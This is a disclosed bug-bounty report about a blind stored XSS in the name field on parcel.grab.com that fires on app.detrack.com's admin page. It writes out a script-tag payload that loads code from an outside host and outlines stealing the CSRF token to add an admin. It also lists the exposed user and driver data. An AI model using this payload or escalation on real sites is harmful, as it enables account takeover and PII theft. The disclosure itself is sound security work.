---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2017-09-14
submitted: 2017-07-19T14:37:48.344Z
bounty_usd: 750
votes: 50
cve: []
program: "[[programs/grab|Grab]]"
reporter: "paresh_parmar"
source: "https://hackerone.com/reports/251224"
title: "Blind stored xss [parcel.grab.com] > name parameter "
---
# Blind stored xss [parcel.grab.com] > name parameter 

> **Severity:** Critical | **Bounty:** 750 USD | **Votes:** 50 | **Program:** Grab | **Disclosed:** 2017-09-14

- Report: [https://hackerone.com/reports/251224](https://hackerone.com/reports/251224)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2017-07-19T14:37:48.344Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi,


___my previously reported blind xss is fixed but i found same type of xss in diffrent area with more impact.___


# Steps to repro:
1. create new account with name `"><script src=https://x.com></script>` here https://parcel.grab.com/
2.  afftected page is https://app.detrack.com/a/
where admin can see all the user's of application
and this is one more impact full because it contains all the user's email address. attacker can hijack all the information from there using xss
affeffcted page poc:
{F204498██████████
3. go here https://app.detrack.com/a/ and find ████████ , that is my account with xss payload.


thanks

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Severity Updated**
- **2017-07-20** @paresh_parmar: yes, i created account on detrack, checking other endpoints too. 
so far only name parameter is vulnerable.
- **2017-07-21** @paresh_parmar: Hi,
fyi, 
currently app.detrack.com using `authenticity_token` for protect csrf attack, which you can find in source in every page, 
i can hijack that token using ___BXSS___ ,and force admin to make requests.  
Ex:
adding another admin to your account,which is lead to full account takeover of detrack service, 
{F205424███████ 

hope you fix xss soon, and i tested on my detrack account only .

Thanks
- **2017-07-24** @nozz_: Hello @paresh_parmar 

Thank you very much for that additional information. 
Are you saying that the XSS is still exploitable and reflected on https://app.detrack.com/a/ ?
- **2017-07-24** @paresh_parmar: not now, i guess its fixed, tried multiple payloads but never got any response back, 
so it is fixed now.
- **2017-07-31** @paresh_parmar: @nozz_   since issue has been fixed.  any update?
- **Report Resolved**
- **2017-08-09** @paresh_parmar: Hey any update on bounty ?
- **Agreed On Going Public**
- **Bounty Awarded**
- **2017-08-23** @paresh_parmar: this report is going to disclose soon. 
adding more details for other people.   reported 2 bxss, in other report contains lots of sensitive details, so disclousing this one only .


___what was the impact  of this xss?___ 
stored xss executed into admin's account, where all the users,drivers details are stored.
name,email,org  
{F215136█████████

+ 
id,mobile details 
{F215139██████████
you can see ___id___ parameter, that is driver's unique id, im able to add that id into my account and once i added id , id reflectes drivers location .
{F215140████ 





 @grab  rewared this issue in `Medium Security Issue` instead of high/critical `personally Identifiable Information (PII) disclouser` 
   because overall its just ___XSS___ for them.
- **Report Became Public**
